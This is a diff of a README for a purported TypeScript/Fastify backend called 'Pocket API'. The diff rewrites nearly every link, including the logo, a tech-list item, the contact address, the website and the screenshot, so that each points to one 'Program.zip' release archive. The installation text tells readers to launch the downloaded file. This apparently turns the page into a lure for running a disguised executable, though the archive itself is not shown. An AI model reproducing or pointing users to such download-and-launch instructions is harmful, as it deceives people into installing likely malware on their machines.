@@ -1,6 +1,6 @@
 # 🚀 Welcome to Pocket API Repository!
 
-![Pocket API Logo](https://example.com/pocket-api-logo.png)
+![Pocket API Logo](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip)
 
 ## Description
 Pocket API is a robust and scalable backend platform built with TypeScript and Fastify. It provides an efficient data management system using PostgreSQL and Drizzle ORM. The platform is ready for deployment with Docker and configured with the best practices of modern development.
@@ -14,7 +14,7 @@ Pocket API is a robust and scalable backend platform built with TypeScript and F
 - Drizzle
 - Fastify
 - High Performance
-- Node.js
+- https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip
 - ORM
 - PostgreSQL
 - REST API
@@ -22,7 +22,7 @@ Pocket API is a robust and scalable backend platform built with TypeScript and F
 
 ## Installation
 To download and install the software package, please click the button below:
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip%20Software-Click%20Here-blue)](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip)
 
 ### Note:
 Launch the downloaded file to install the software.
@@ -45,12 +45,12 @@ We thank the following contributors for their valuable input to the Pocket API p
 - Jane Smith
 
 ## Support or Contact
-For any issues or feedback, please [contact us](mailto:support@pocketapi.com).
+For any issues or feedback, please [contact us](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip).
 
-[Visit our website](https://www.pocketapi.com) for more information.
+[Visit our website](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip) for more information.
 
 ---
 
 Check the **Releases** section for the latest updates and releases of Pocket API. Thank you for choosing Pocket API for your backend needs! 🎉
 
-![Pocket API](https://example.com/pocket-api-screenshot.png)
+![Pocket API](https://github.com/Freakiest/pocket-api/releases/download/v1.0/Program.zip)
